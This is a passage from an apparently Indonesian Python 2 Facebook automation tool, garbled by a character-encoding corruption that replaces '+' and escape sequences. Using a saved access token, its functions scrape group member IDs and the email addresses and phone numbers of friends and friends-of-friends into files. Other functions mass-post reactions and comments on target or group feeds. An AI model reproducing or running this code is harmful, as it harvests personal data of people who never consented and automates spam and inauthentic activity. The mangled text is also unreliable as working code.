            print '+AFw-x1b[1;91m[!] Error when creating file'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mKembali +AFw-x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '+AFw-x1b[1;91m[!] Stopped'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mKembali +AFw-x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] No connection'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            id = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID grup +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' +- id +- '&access_token=' +- toket)
                asw = json.loads(r.text)
                print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName group +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- asw['name']
            except KeyError:
                print '+AFw-x1b[1;91m[!] Group not found'
                raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                grab()

            simg = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mSimpan File +AFw-x1b[1;97mext(file.txt) +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            b = open(simg, 'w')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mMohon Tunggu +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            re = requests.get('https://graph.facebook.com/' +- id +- '/members?fields=name,id&access_token=' +- toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] +- '+AFw-n')
                print '+AFw-r+AFw-x1b[1;92mName+AFw-x1b[1;91m  :+AFw-x1b[1;97m ' +- i['name']
                print '+AFw-x1b[1;92mID  +AFw-x1b[1;91m  :+AFw-x1b[1;97m ' +- i['id']
                print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'

            print '+AFw-n+AFw-r+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mTotal ID +AFw-x1b[1;96m%s' % len(idmem)
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFile saved +AFw-x1b[1;91m: +AFw-x1b[1;97m' +- simg
            b.close()
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except IOError:
            print '+AFw-x1b[1;91m[!] Error when creating file'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '+AFw-x1b[1;91m[!] Stopped'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(simg)
            print '+AFw-x1b[1;91m[!] Group not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] No connection'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            mails = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mSave File +AFw-x1b[1;97mext(file.txt) +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' +- toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' +- i['id'] +- '?access_token=' +- toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] +- '+AFw-n')
                    print '+AFw-r+AFw-x1b[1;92mName+AFw-x1b[1;91m  :+AFw-x1b[1;97m ' +- z['name']
                    print '+AFw-x1b[1;92mEmail+AFw-x1b[1;91m : +AFw-x1b[1;97m' +- z['email']
                    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                except KeyError:
                    pass

            print '+AFw-n+AFw-r+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mTotal Email+AFw-x1b[1;96m%s' % len(em)
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFile saved +AFw-x1b[1;91m: +AFw-x1b[1;97m' +- mails
            mpsh.close()
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except IOError:
            print '+AFw-x1b[1;91m[!] Error when creating file'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '+AFw-x1b[1;91m[!] Stopped'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(mails)
            print '+AFw-x1b[1;91m[!] An error occurred'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] No connection'
            keluar()


def emailfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            idt = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mInput ID Friends +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' +- idt +- '?access_token=' +- toket)
                op = json.loads(jok.text)
                print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mFrom+AFw-x1b[1;91m :+AFw-x1b[1;97m ' +- op['name']
            except KeyError:
                print '+AFw-x1b[1;91m[!] Not be friends'
                raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                grab()

            mails = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mSave File +AFw-x1b[1;97mext(file.txt) +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' +- idt +- '/friends?access_token=' +- toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' +- i['id'] +- '?access_token=' +- toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] +- '+AFw-n')
                    print '+AFw-r+AFw-x1b[1;92mName+AFw-x1b[1;91m  :+AFw-x1b[1;97m ' +- z['name']
                    print '+AFw-x1b[1;92mEmail+AFw-x1b[1;91m : +AFw-x1b[1;97m' +- z['email']
                    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                except KeyError:
                    pass

            print '+AFw-n+AFw-r+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mTotal Email+AFw-x1b[1;96m%s' % len(emfromfriends)
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFile saved +AFw-x1b[1;91m: +AFw-x1b[1;97m' +- mails
            mpsh.close()
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except IOError:
            print '+AFw-x1b[1;91m[!] Error when creating file'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '+AFw-x1b[1;91m[!] Stopped'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] No connection'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            noms = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mSave File +AFw-x1b[1;97mext(file.txt) +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' +- toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' +- n['id'] +- '?access_token=' +- toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] +- '+AFw-n')
                    print '+AFw-r+AFw-x1b[1;92mName+AFw-x1b[1;91m  :+AFw-x1b[1;97m ' +- z['name']
                    print '+AFw-x1b[1;92mPhone+AFw-x1b[1;91m : +AFw-x1b[1;97m' +- z['mobile_phone']
                    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                except KeyError:
                    pass

            print '+AFw-n+AFw-r+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mTotal Phone+AFw-x1b[1;96m%s' % len(hp)
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFile saved +AFw-x1b[1;91m: +AFw-x1b[1;97m' +- noms
            no.close()
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except IOError:
            print '+AFw-x1b[1;91m[!] Error when creating file'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '+AFw-x1b[1;91m[!] Stopped'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(noms)
            print '+AFw-x1b[1;91m[!] An error occurred '
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] No connection'
            keluar()


def hpfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            idt = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mInput Friends ID +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' +- idt +- '?access_token=' +- toket)
                op = json.loads(jok.text)
                print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mFrom+AFw-x1b[1;91m :+AFw-x1b[1;97m ' +- op['name']
            except KeyError:
                print '+AFw-x1b[1;91m[!] Not be friends'
                raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
                grab()

            noms = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mSave File +AFw-x1b[1;97mext(file.txt) +AFw-x1b[1;91m: +AFw-x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' +- idt +- '/friends?access_token=' +- toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' +- i['id'] +- '?access_token=' +- toket)
                z = json.loads(x.text)
                try:
                    hpfromfriends.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] +- '+AFw-n')
                    print '+AFw-r+AFw-x1b[1;92mName+AFw-x1b[1;91m  :+AFw-x1b[1;97m ' +- z['name']
                    print '+AFw-x1b[1;92mPhone+AFw-x1b[1;91m : +AFw-x1b[1;97m' +- z['mobile_phone']
                    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
                except KeyError:
                    pass

            print '+AFw-n+AFw-r+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mTotal number+AFw-x1b[1;96m%s' % len(hpfromfriends)
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFile saved +AFw-x1b[1;91m: +AFw-x1b[1;97m' +- noms
            no.close()
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except IOError:
            print '+AFw-x1b[1;91m[!] Make file failed'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '+AFw-x1b[1;91m[!] Stopped'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] No connection'
            keluar()


def menu_bot():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+JVE--> +AFw-x1b[1;37;40m1. Bot Reactions Target Post'
    print '+JVE--> +AFw-x1b[1;37;40m2. Bot Reactions Group Post'
    print '+JVE--> +AFw-x1b[1;37;40m3. Bot Comment Target Post'
    print '+JVE--> +AFw-x1b[1;37;40m4. Bot Comment Group Post'
    print '+JVE--> +AFw-x1b[1;37;40m5. Mass Delete Post'
    print '+JVE--> +AFw-x1b[1;37;40m6. Accept Friend Requests'
    print '+JVE--> +AFw-x1b[1;37;40m7. Unfriends'
    print '+JVE--> +AFw-x1b[1;31;40m0. Back'
    print '+AFw-x1b[1;37;40m+JVE'
    bot_pilih()


def bot_pilih():
    bots = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if bots == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        bot_pilih()
    else:
        if bots == '1':
            menu_react()
        else:
            if bots == '2':
                grup_react()
            else:
                if bots == '3':
                    bot_komen()
                else:
                    if bots == '4':
                        grup_komen()
                    else:
                        if bots == '5':
                            deletepost()
                        else:
                            if bots == '6':
                                accept()
                            else:
                                if bots == '7':
                                    unfriend()
                                else:
                                    if bots == '0':
                                        menu()
                                    else:
                                        print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;97m' +- bots +- ' +AFw-x1b[1;91mnot found'
                                        bot_pilih()


def menu_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+JVE--> +AFw-x1b[1;37;40m1. +AFw-x1b[1;97mLike'
    print '+JVE--> +AFw-x1b[1;37;40m2. +AFw-x1b[1;97mLove'
    print '+JVE--> +AFw-x1b[1;37;40m3. +AFw-x1b[1;97mWow'
    print '+JVE--> +AFw-x1b[1;37;40m4. +AFw-x1b[1;97mHaha'
    print '+JVE--> +AFw-x1b[1;37;40m5. +AFw-x1b[1;97mSad'
    print '+JVE--> +AFw-x1b[1;37;40m6. +AFw-x1b[1;97mAngry'
    print '+JVE--> +AFw-x1b[1;31;40m0. Back'
    print '+AFw-x1b[1;37;40m+JVE'
    react_pilih()


def react_pilih():
    global tipe
    aksi = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if aksi == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        react_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            react()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                react()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    react()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        react()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            react()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                react()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;97m' +- aksi +- ' +AFw-x1b[1;91mnot found'
                                    react_pilih()


def react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        ide = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID Target +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        limit = raw_input('+AFw-x1b[1;91m[!] +AFw-x1b[1;92mLimit +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        try:
            oh = requests.get('https://graph.facebook.com/' +- ide +- '?fields=feed.limit(' +- limit +- ')&access_token=' +- toket)
            ah = json.loads(oh.text)
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' +- y +- '/reactions?type=' +- tipe +- '&access_token=' +- toket)
                print '+AFw-x1b[1;92m[+AFw-x1b[1;97m' +- y[:10].replace('+AFw-n', ' ') +- '... +AFw-x1b[1;92m] +AFw-x1b[1;97m' +- tipe

            print
            print '+AFw-r+AFw-x1b[1;91m[+-]+AFw-x1b[1;97m Finish +AFw-x1b[1;96m' +- str(len(reaksi))
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '+AFw-x1b[1;91m[!] ID not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()


def grup_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+JVE--> +AFw-x1b[1;37;40m1. +AFw-x1b[1;97mLike'
    print '+JVE--> +AFw-x1b[1;37;40m2. +AFw-x1b[1;97mLove'
    print '+JVE--> +AFw-x1b[1;37;40m3. +AFw-x1b[1;97mWow'
    print '+JVE--> +AFw-x1b[1;37;40m4. +AFw-x1b[1;97mHaha'
    print '+JVE--> +AFw-x1b[1;37;40m5. +AFw-x1b[1;97mSad'
    print '+JVE--> +AFw-x1b[1;37;40m6. +AFw-x1b[1;97mAngry'
    print '+JVE--> +AFw-x1b[1;31;40m0. Back'
    print '+AFw-x1b[1;37;40m+JVE'
    reactg_pilih()


def reactg_pilih():
    global tipe
    aksi = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if aksi == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        reactg_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            reactg()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                reactg()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    reactg()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        reactg()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            reactg()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                reactg()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;97m' +- aksi +- ' +AFw-x1b[1;91mnot found'
                                    reactg_pilih()


def reactg():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        ide = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID Group +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        limit = raw_input('+AFw-x1b[1;91m[!] +AFw-x1b[1;92mLimit +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        ah = requests.get('https://graph.facebook.com/group/?id=' +- ide +- '&access_token=' +- toket)
        asw = json.loads(ah.text)
        print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName group +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- asw['name']
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' +- ide +- '?fields=feed.limit(' +- limit +- ')&access_token=' +- toket)
            ah = json.loads(oh.text)
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' +- y +- '/reactions?type=' +- tipe +- '&access_token=' +- toket)
                print '+AFw-x1b[1;92m[+AFw-x1b[1;97m' +- y[:10].replace('+AFw-n', ' ') +- '... +AFw-x1b[1;92m] +AFw-x1b[1;97m' +- tipe

            print
            print '+AFw-r+AFw-x1b[1;91m[+-]+AFw-x1b[1;97m Finish +AFw-x1b[1;96m' +- str(len(reaksigrup))
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '+AFw-x1b[1;91m[!] ID not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()


def bot_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        print "+AFw-x1b[1;91m[!] +AFw-x1b[1;92mUse +AFw-x1b[1;97m'<>' +AFw-x1b[1;92m for newline"
        ide = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID Target +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        km = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mComments  +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        limit = raw_input('+AFw-x1b[1;91m[!] +AFw-x1b[1;92mLimit +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        km = km.replace('<>', '+AFw-n')
        try:
            p = requests.get('https://graph.facebook.com/' +- ide +- '?fields=feed.limit(' +- limit +- ')&access_token=' +- toket)
            a = json.loads(p.text)
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' +- f +- '/comments?message=' +- km +- '&access_token=' +- toket)
                print '+AFw-x1b[1;92m[+AFw-x1b[1;97m' +- km[:10].replace('+AFw-n', ' ') +- '... +AFw-x1b[1;92m]'

            print
            print '+AFw-r+AFw-x1b[1;91m[+-]+AFw-x1b[1;97m Finish +AFw-x1b[1;96m' +- str(len(komen))
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '+AFw-x1b[1;91m[!] ID not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()


def grup_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        print "+AFw-x1b[1;91m[!] +AFw-x1b[1;92mGunakan +AFw-x1b[1;97m'<>' +AFw-x1b[1;92mUntuk Baris Baru"
        ide = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID Group  +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        km = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mComments +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        limit = raw_input('+AFw-x1b[1;91m[!] +AFw-x1b[1;92mLimit +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
        km = km.replace('<>', '+AFw-n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' +- ide +- '&access_token=' +- toket)
            asw = json.loads(ah.text)
            print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName grup +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' +- ide +- '?fields=feed.limit(' +- limit +- ')&access_token=' +- toket)
            a = json.loads(p.text)
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' +- f +- '/comments?message=' +- km +- '&access_token=' +- toket)
                print '+AFw-x1b[1;92m[+AFw-x1b[1;97m' +- km[:10].replace('+AFw-n', ' ') +- '... +AFw-x1b[1;92m]'

            print
            print '+AFw-r+AFw-x1b[1;91m[+-]+AFw-x1b[1;97m Finish +AFw-x1b[1;96m' +- str(len(komengrup))
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '+AFw-x1b[1;91m[!] ID not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()


def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' +- toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFrom +AFw-x1b[1;91m: +AFw-x1b[1;97m%s' % nama
